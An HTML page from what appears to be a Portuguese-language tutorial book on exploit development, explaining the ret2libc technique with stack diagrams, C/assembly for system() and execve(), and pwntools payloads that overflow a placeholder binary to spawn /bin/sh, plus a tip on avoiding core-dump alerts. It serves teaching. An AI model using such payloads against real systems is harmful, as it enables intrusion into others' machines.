@@ -1,0 +1,415 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Ret2LibC - Um Livrinho Sobre Exploit Dev</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <base href="../../">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <link rel="shortcut icon" href="favicon.png">
+
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme -->
+        
+
+        
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
+    </head>
+    <body class="light">
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+        </script>
+
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li><a href="./aventura.html"><strong>1.</strong> Aventura</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>3.</strong> Mitigações</a></li><li><strong>4.</strong> from pwn import *</li><li><a href="./stack/ret2libc/intro.html" class="active"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Pratica</li><li><ul class="section"><li><strong>5.1.1.</strong> Protostar Stack Six</li></ul></li><li><strong>5.2.</strong> Múltiplos estágios</li><li><strong>5.3.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><strong>6.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>6.1.</strong> Brainpan</li><li><strong>6.2.</strong> Tib3rius BOF Prep</li></ul></li><li><strong>7.</strong> ROP</li><li><ul class="section"><li><strong>7.1.</strong> Primitivos</li><li><ul class="section"><li><strong>7.1.1.</strong> ROPE</li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><strong>7.2.1.</strong> ROPE: pivot</li></ul></li></ul></li><li><strong>8.</strong> Derrotando ASLR</li><li><strong>9.</strong> Derrotando Canaries</li><li class="spacer"></li><li><strong>10.</strong> Phoenix: Format</li><li class="spacer"></li><li><strong>11.</strong> Teoria</li><li><strong>12.</strong> Básico</li><li><ul class="section"><li><strong>12.1.</strong> Fastbins Dup</li><li><strong>12.2.</strong> House of Force</li><li><strong>12.3.</strong> Unsafe Unlink</li><li><strong>12.4.</strong> Safe Unlink</li><li><strong>12.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>12.6.</strong> Frame Faking</li></ul></li><li><strong>13.</strong> Intermediário</li><li><ul class="section"><li><strong>13.1.</strong> House of Orange</li><li><ul class="section"><li><strong>13.1.1.</strong> Heap Extension</li><li><strong>13.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>13.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>13.2.</strong> House of Spirit</li></ul></li><li><strong>14.</strong> Avançado</li><li><ul class="section"><li><strong>14.1.</strong> House of Rust</li></ul></li><li><strong>15.</strong> Shellphish: How2Heap</li><li class="spacer"></li><li><strong>16.</strong> Intro AFL</li></ul>
+        </div>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page" tabindex="-1">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div class="left-buttons">
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                    </div>
+
+                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="content" class="content">
+                    <a class="header" href="./stack/ret2libc/intro.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
+<p>Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso,
+ter domínio dessa técnica facilitar a compreensão de ROP. :D</p>
+<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos
+encontrar outra maneira de conseguir uma shell... Assim, vamos precisar
+encontrar uma parte executável na memoria! Uma função do próprio programa!</p>
+<p>Voce se lembra de quando chamávamos uma <code>call_me()</code> ou <code>win()</code> nos desafios
+iniciais? Então... poderíamos fazer isso... mas ninguém colocaria uma
+função pre-pronta pra nos dar uma shell :(</p>
+<p>Felizmente, existe LibC, e dentro dela existem múltiplas funções úteis!</p>
+<a class="header" href="./stack/ret2libc/intro.html#funções-Úteis" id="funções-Úteis"><h1>Funções Úteis</h1></a>
+<a class="header" href="./stack/ret2libc/intro.html#system" id="system"><h2>System()</h2></a>
+<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
+<p>Para nosso propósito, ela recebe 1 argumento, o caminho do programa para
+executar (Ex: <code>/bin/sh</code>)</p>
+<p>Em C:</p>
+<pre><code class="language-C">#include &lt;stdlib.h&gt;
+int main() {
+    system(&quot;/bin/ls&quot;);
+    return 0;
+}
+</code></pre>
+<p>Em assembly:</p>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;/bin/ls&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        mov     edi, OFFSET FLAT:.LC0
+        call    System
+        mov     eax, 0
+        pop     rbp
+        ret
+</code></pre>
+<p>A função recebe um pointer para a string via <code>rdi</code> (64 bits) ou os
+argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32
+bits!</p>
+<a class="header" href="./stack/ret2libc/intro.html#conseguindo-o-pointer-para-binsh" id="conseguindo-o-pointer-para-binsh"><h4>Conseguindo o pointer para /bin/sh</h4></a>
+<p>Usando pwntools:</p>
+<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
+</code></pre>
+<p>x sera um pointer contendo o endereço da string <code>/bin/sh</code></p>
+<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
+<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
+Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
+<a class="header" href="./stack/ret2libc/intro.html#layout-da-stack-numa-call-32-bits" id="layout-da-stack-numa-call-32-bits"><h4>Layout da stack numa call 32 bits</h4></a>
+<pre><code class="language-x86asm">    Func_1
+ ____________
+|            |
+|    RBP     | 
+|____________| 
+ ____________
+|            |
+|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
+|____________|      Porem, nao costumamos pensar o que acontece depois!
+ ____________
+|            |      Um ret simplesmente significa:
+|   ARG_1    |         pop RIP
+|____________|         jmp RIP
+ ____________           
+|            |      E como em qualquer pop, RSP se movimenta
+|   ARG_2    |
+|____________| 
+
+    Func_1                                             System
+ ____________                                       ____________            
+|            |                                     |            |
+|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
+|____________|   Então da perspectiva de System,   |____________|
+ ____________           ARG_1 vira RIP              ____________       
+|            |          ARG_2 vira ARG_1           |            |
+|    RIP     |   ____                              |            |
+|____________|       |                             |____________|
+ ____________        |                              ____________
+|            |       V                             |            |  
+|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
+|____________|                                     |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|   ARG_2    |                                     |   ARG_1    |
+|____________|                                     |____________|
+
+
+    Func_1                                             System
+ ____________                                       ____________            
+|            |                                     |            |
+| AAAAAAAAAA |    A Func_1 esta vulnerável a BOF   |            |
+|____________|                                     |____________|
+ ____________                                       ____________       
+|            |    E nos controlamos a stack :D     |            |
+|  SYSTEM()  |    Então podemos passar os args     |            |
+|____________|    e o RIP de retorno para System   |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
+|____________|                                     |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
+|____________|                                     |____________|
+
+                  System (ou qualquer outra 
+                  função que voce chamar) 
+                  vai executar /bin/sh e 
+                  tentar retornar para DDDDDDDD
+
+</code></pre>
+<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
+<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
+<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo
+(<code>fork</code>, gerando um processo secundário: <code>child_proc</code>)!</p>
+<p>Então retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera
+reportado para o processo principal e nao para o computador!</p>
+<blockquote>
+<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
+</blockquote>
+<a class="header" href="./stack/ret2libc/intro.html#unindo-tudo" id="unindo-tudo"><h3>Unindo tudo</h3></a>
+<p>Vamos supor que o programa esta vulnerável a um BoF tradicional na função
+<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
+<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF(&quot;./blablabla&quot;)
+libc = elf.libc
+
+payload = b&quot;&quot;
+payload += b&quot;A&quot; * 40            # Padding
+payload += p32(libc.sym.system) # RIP salvo batata()
+payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
+payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
+</code></pre>
+<p>Caso voce esteja com pressa, adios!</p>
+<p>Daqui em diante eu vou discutir técnicas alternativas de ret2libc, vantagens
+e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender
+ROP!</p>
+<a class="header" href="./stack/ret2libc/intro.html#execve--exit" id="execve--exit"><h2>Execve() + Exit()</h2></a>
+<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
+<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e
+funciona igual <code>System</code>, porem com uma diferença: <code>System</code> cria um novo
+processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
+<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em
+<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce
+simplesmente chamar ele, quando voce fechar a shell vai gerar uma
+<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
+<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e
+ativando mecanismos de segurança que alertam o dono do servidor!</p>
+<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o
+programa finalize silenciosamente!</p>
+<p>Alem disso, existe mais uma diferença, <code>execve</code> recebe 3 argumentos:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  execve(&quot;./blablabla&quot;, NULL, NULL);
+  return 1;
+}
+</code></pre>
+<p>O primeiro: programa a ser executado</p>
+<p>O segundo: argv (poderíamos passar <code>-p</code> para <code>sh</code> manter os privilégios)</p>
+<p>O terceiro: envp (environment vars)</p>
+<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
+<p>Em 64 bits precisaríamos de múltiplos gadgets para salvar um em cada register</p>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        mov     edx, 0                ; envp
+        mov     esi, 0                ; argv
+        mov     edi, OFFSET FLAT:.LC0 ; programa
+        call    execve
+        mov     eax, 1
+        pop     rbp
+        ret
+</code></pre>
+<p>Caso voce queira usar argv:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
+  execve(&quot;./blablabla&quot;, argv, NULL);
+  return 1;
+}
+</code></pre>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;arg1&quot;
+.LC1:
+        .string &quot;arg2&quot;
+.LC2:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        sub     rsp, 32
+        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
+        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
+        mov     QWORD PTR [rbp-16], 0
+        lea     rax, [rbp-32]
+        mov     edx, 0
+        mov     rsi, rax
+        mov     edi, OFFSET FLAT:.LC2
+        call    execve
+        mov     eax, 1
+        leave
+        ret
+</code></pre>
+<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
+<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
+  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
+  execve(&quot;./blablabla&quot;, argv, envp);
+  return 1;
+}}
+</code></pre>
+<pre><code class="language-x86asm">..LC0:
+        .string &quot;arg1&quot;
+.LC1:
+        .string &quot;arg2&quot;
+.LC2:
+        .string &quot;env1&quot;
+.LC3:
+        .string &quot;env2&quot;
+.LC4:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        sub     rsp, 64
+        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
+        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
+        mov     QWORD PTR [rbp-16], 0
+        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
+        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
+        mov     QWORD PTR [rbp-48], 0
+        lea     rdx, [rbp-64]
+        lea     rax, [rbp-32]
+        mov     rsi, rax
+        mov     edi, OFFSET FLAT:.LC4
+        call    execve
+        mov     eax, 1
+        leave
+        ret
+</code></pre>
+<p>Bem, agora que voce voltou de ficar brincando com a função, vamos voltar a pratica:</p>
+<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF(&quot;./blablabla&quot;)
+libc = elf.libc
+
+payload = b&quot;&quot;
+payload += b&quot;A&quot; * 40                              # Padding
+payload += p32(libc.sym.execve)                   # RIP salvo batata()
+payload += p32(libc.sym.exit)                     # RIP salvo execve()
+payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
+payload += p32(0)                                 # argv execve()
+payload += p32(0)                                 # envp execve()
+</code></pre>
+<p>Os argumentos estão sendo passados conforme convenção... mas eu nao posso garantir!</p>
+<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, preguiça hehehe :/</p>
+<blockquote>
+<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima técnica (<code>mprotect</code>)
+sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
+</blockquote>
+<a class="header" href="./stack/ret2libc/intro.html#mprotect--ret2shellcode-todo" id="mprotect--ret2shellcode-todo"><h2>Mprotect() + ret2shellcode (~TODO~)</h2></a>
+<a class="header" href="./stack/ret2libc/intro.html#pontos-fracos" id="pontos-fracos"><h1>Pontos Fracos</h1></a>
+<a class="header" href="./stack/ret2libc/intro.html#estaticamente-linkado" id="estaticamente-linkado"><h2>Estaticamente Linkado</h2></a>
+<p>Em programas estaticamente linkados ao libc, somente podemos usar uma
+fração das funções presentes, pois somente as que sao originalmente usadas
+pelo programa sao linkadas!</p>
+<a class="header" href="./stack/ret2libc/intro.html#dinamicamente-linkado--aslr" id="dinamicamente-linkado--aslr"><h2>Dinamicamente Linkado (+ ASLR)</h2></a>
+<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o
+potencial do libc. Porem caso o computador possua ASLR ligado, sera
+necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou
+executar o exploit em loop ate voce dar sorte (viável somente em
+computadores 32 bits).</p>
+
+                </div>
+
+                <!-- Mobile navigation buttons -->
+                
+                    <a rel="prev" href="./stack/mitigacoes.html" class="mobile-nav-chapters previous" title="Previous chapter">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+
+            </div>
+
+            
+                <a href="./stack/mitigacoes.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+            
+
+            
+
+        </div>
+
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        
+
+        
+
+        
+
+        
+
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS script -->
+        
+
+    </body>
+</html>
